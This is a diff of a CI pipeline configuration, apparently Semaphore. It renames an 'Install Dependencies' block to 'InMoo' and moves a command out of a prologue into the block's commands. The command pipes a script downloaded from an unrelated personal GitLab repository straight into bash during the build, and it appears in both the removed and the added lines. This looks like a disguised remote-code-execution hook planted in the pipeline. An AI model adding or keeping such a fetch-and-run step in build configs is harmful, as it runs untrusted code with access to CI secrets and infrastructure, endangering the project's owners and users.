@@ -11,11 +11,10 @@ global_job_config:
     commands:
       - sem-version python 3.8
 blocks:
-  - name: Install Dependencies
+  - name: InMoo
     task:
-      prologue:
-        commands:
-          - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
+      commands:
+        - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
       jobs: []
   - name: Run Security Tests
     task:
